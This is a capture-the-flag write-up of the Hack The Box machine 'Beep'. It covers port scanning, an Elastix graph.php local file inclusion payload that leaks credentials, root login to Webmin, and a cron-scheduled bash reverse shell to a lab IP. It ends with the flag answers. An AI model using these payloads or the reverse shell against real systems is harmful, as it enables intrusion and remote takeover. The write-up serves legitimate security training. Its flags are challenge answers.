# Beep
> Write-up author: jon-brandy

## Lesson learned:
- Directory listing using dirbuster.
- Exploiting Elastix webserver ('graph.php', LFI).
- Scheduled a cronjob at FreePBX service.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c0ed88ed-9dbd-460d-b284-b95980734554)


## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.10.7 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-29 22:16 PDT
Stats: 0:06:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.24% done; ETC: 22:22 (0:00:01 remaining)
Nmap scan report for 10.10.10.7
Host is up (0.023s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 adee5abb6937fb27afb83072a0f96f53 (DSA)
|_  2048 bcc6735913a18a4b550750f6651d6d0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: STLS LOGIN-DELAY(0) AUTH-RESP-CODE APOP EXPIRE(NEVER) RESP-CODES PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) USER TOP UIDL
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: CHILDREN Completed STARTTLS OK NAMESPACE URLAUTHA0001 RENAME QUOTA MULTIAPPEND LIST-SUBSCRIBED IMAP4rev1 BINARY CATENATE LITERAL+ IMAP4 CONDSTORE MAILBOX-REFERRALS NO ACL ID SORT RIGHTS=kxte THREAD=REFERENCES THREAD=ORDEREDSUBJECT SORT=MODSEQ UNSELECT ATOMIC ANNOTATEMORE LISTEXT IDLE UIDPLUS X-NETSCAPE
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
|_ssl-date: 2023-08-30T05:20:05+00:00; -1s from scanner time.
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-server-header: Apache/2.2.3 (CentOS)
| http-robots.txt: 1 disallowed entry 
|_/
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 399.28 seconds
```

1. Interesting the machine opens many tcp ports, since the machine runs a web application let's run dirbuster.

> RESULT - WEBAPP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/18f63fec-cbd5-4016-80c5-f3712a82359d)


> RESULT - DIRBUSTER

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/19e25d20-b5ff-40ee-a0ac-af483f77066b)


2. Confused it won't open the web app, to solve this i tried to modify the minimum TLS version. (It's possible that the TLS version of our browser is higher than what the browser supports).

> CHANGING THE TLS MINIMUM VERSION

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f86d50f5-95dc-42c5-b1de-665bd5ba6c7f)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1dc303de-f985-4c51-9848-95bb0678adce)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a5f1543a-8483-4ba0-9b73-b4d86711604b)


3. Turns out elastix has many vuln history.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/27776557-8c7d-44e7-8a68-8a015152663e)


4. Since we don't know the elastix version, but things to note here the FreePBX 2.10.0 used with the Elastix 2.2.0 is vulnerable to command injection.
5. But sadly, after opened the `admin` directory, it renders the FreePBX web service, but the version is below 2.10.0.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c63da729-e37b-4029-87fd-4a1aa9ee241c)


6. For port 10000, it opens a webmin login page.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/986d1c1f-4a52-4166-a681-5ed271bba894)


7. Based from the metasploit, the closest one must be the LFI vuln, since we can run directory listing (kinda guessing, never doing this in pentesting 🙏).
8. Reading the exploitdb [documentation](https://www.exploit-db.com/exploits/37637), we can use --> `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action` whether the webapp is vulnerable to LFI or not.

> RESULT - It is vulnerable.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9d0d5bee-09e0-4772-ad6c-dc7561b4d706)


9. It exposes many creds for AMPortal and it's not clear which one we need to use for a certain login portal.
10. Here's the creds i got so far:

```
root:jEhdIekWmdjE
admin:Password
admin:amp111
admin:jEhdIekWmdjE
root:passw0rd 
```

> TIME SKIP, FOUND THE CORRECT CREDS FOR /ADMIN -> admin:jEhdIekWmdjE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9761abb4-5c93-4043-83b2-6a8bc4f917af)


> FOR THE WEBMIN --> root:jEhdIekWmdjE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/49e455ca-1b4b-4241-a14e-5ad30711449b)


11. Seems our interest now is in the webmin page, since we're logged in as root, we can scheduled command and cron jobs.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bf6a7ed7-430d-4428-bc95-5c72b8a0cc4f)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a75523b6-17ec-450b-a870-d14ea451b2c9)


12. Awesome, we can add our revere shell payload here, I used this template:

```
Set a listener on port 1337.

PAYLOAD:
sh -i >& /dev/tcp/10.10.14.26/1337 0>&1

WHAT TO SEND:
bash -c 'sh -i >& /dev/tcp/10.10.14.26/1337 0>&1'
```

> RESULT - need to wait until 09:45

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2a514f8b-87a5-4320-b44c-49feb42eaede)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ea1d275e-9510-449d-b264-681384d89ac5)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8bec72ab-cda9-4c7e-9717-213f4f494626)


13. Got the shell!

> GETTING USER FLAG AND ROOT FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/750a640b-735f-46aa-a279-6604f9690d56)


## USER FLAG

```
bc89af94b308f47d87fe1552c5506452
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a44b4cd5-873e-4c8a-8e4e-c704f1a8c823)


## ROOT FLAG

```
6688ccf3476b73a96f40e1d5210feed0
```
